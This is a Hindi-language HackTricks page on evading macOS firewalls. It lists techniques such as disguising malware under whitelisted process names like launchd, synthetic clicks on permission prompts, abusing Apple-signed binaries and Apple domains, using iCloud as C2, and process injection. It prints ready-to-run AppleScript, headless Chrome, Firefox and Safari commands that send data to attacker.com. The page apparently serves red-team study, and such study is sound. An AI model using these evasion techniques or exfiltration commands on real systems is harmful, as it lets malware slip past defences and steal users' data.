# macOS फ़ायरवॉल को छलकरना

<details>

<summary><strong>जानें AWS हैकिंग को शून्य से हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> के साथ!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप अपनी **कंपनी का विज्ञापन HackTricks में देखना चाहते हैं** या **HackTricks को PDF में डाउनलोड करना चाहते हैं** तो [**सब्सक्रिप्शन प्लान्स देखें**](https://github.com/sponsors/carlospolop)!
* [**आधिकारिक PEASS और HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* हमारे विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) कलेक्शन, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) खोजें
* **शामिल हों** 💬 [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या हमें **ट्विटर** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)** पर फ़ॉलो** करें।
* **हैकिंग ट्रिक्स साझा करें** द्वारा PRs सबमिट करके [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos में।

</details>

## पाए गए तकनीक

कुछ macOS फ़ायरवॉल ऐप्स में काम करने वाली निम्नलिखित तकनीकें मिलीं।

### सफेद सूची नामों का दुरुपयोग

* उदाहरण के लिए मैलवेयर को **`launchd`** जैसे जाने-माने macOS प्रक्रियाओं के नाम से बुलाना

### सिंथेटिक क्लिक

* यदि फ़ायरवॉल उपयोगकर्ता से अनुमति के लिए पूछता है तो मैलवेयर को **अनुमति पर क्लिक करने** के लिए

### **एप्पल द्वारा हस्ताक्षरित बाइनरी का उपयोग**

* जैसे **`curl`**, लेकिन अन्य भी जैसे **`whois`**

### जाने-माने एप्पल डोमेन

फ़ायरवॉल को जाने-माने एप्पल डोमेन्स जैसे **`apple.com`** या **`icloud.com`** पर कनेक्शन स्वीकृत कर रहा हो सकता है। और iCloud को C2 के रूप में उपयोग किया जा सकता है।

### सामान्य छलकरना

फ़ायरवॉल को छलकरने के लिए कुछ विचार

### स्वीकृत ट्रैफ़िक की जाँच करें

स्वीकृत ट्रैफ़िक का पता लगाना आपको संभावित व्हाइटलिस्टेड डोमेन्स या जिन एप्लिकेशन्स को उन डोमेन्स तक पहुंचने की अनुमति है, उन्हें पहचानने में मदद करेगा।
```bash
lsof -i TCP -sTCP:ESTABLISHED
```
### DNS का दुरुपयोग

DNS निर्धारण **`mdnsreponder`** साइन की गई एप्लिकेशन के माध्यम से किया जाता है जिसे संभावित रूप से DNS सर्वरों से संपर्क करने की अनुमति दी जाएगी।

<figure><img src="../../.gitbook/assets/image (1) (1) (6).png" alt="https://www.youtube.com/watch?v=UlT5KFTMn2k"><figcaption></figcaption></figure>

### ब्राउज़र ऐप्स के माध्यम से

* **oascript**
```applescript
tell application "Safari"
run
tell application "Finder" to set visible of process "Safari" to false
make new document
set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
end tell
```
* गूगल क्रोम

{% code overflow="wrap" %}
```bash
"Google Chrome" --crash-dumps-dir=/tmp --headless "https://attacker.com?data=data%20to%20exfil"
```
{% endcode %}

* फ़ायरफ़ॉक्स
```bash
firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
```
* सफारी
```bash
open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
```
### द्वारा प्रक्रिया इंजेक्शन

यदि आप **कोड को किसी प्रक्रिया में इंजेक्ट** कर सकते हैं जिसे किसी सर्वर से कनेक्ट करने की अनुमति है, तो आप फ़ायरवॉल सुरक्षा को छल सकते हैं:

{% content-ref url="macos-proces-abuse/" %}
[macos-proces-abuse](macos-proces-abuse/)
{% endcontent-ref %}

## संदर्भ

* [https://www.youtube.com/watch?v=UlT5KFTMn2k](https://www.youtube.com/watch?v=UlT5KFTMn2k)

<details>

<summary><strong>जानें AWS हैकिंग को शून्य से हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> के साथ!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप अपनी **कंपनी का विज्ञापन HackTricks में देखना चाहते हैं** या **HackTricks को PDF में डाउनलोड करना चाहते हैं** तो [**सब्सक्रिप्शन प्लान**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* हमारे विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) कलेक्शन, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) खोजें
* **शामिल हों** 💬 [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या हमें **ट्विटर** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live) पर **फ़ॉलो** करें।
* **हैकिंग ट्रिक्स साझा करें** द्वारा PRs सबमिट करके [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github रेपो में।

</details>
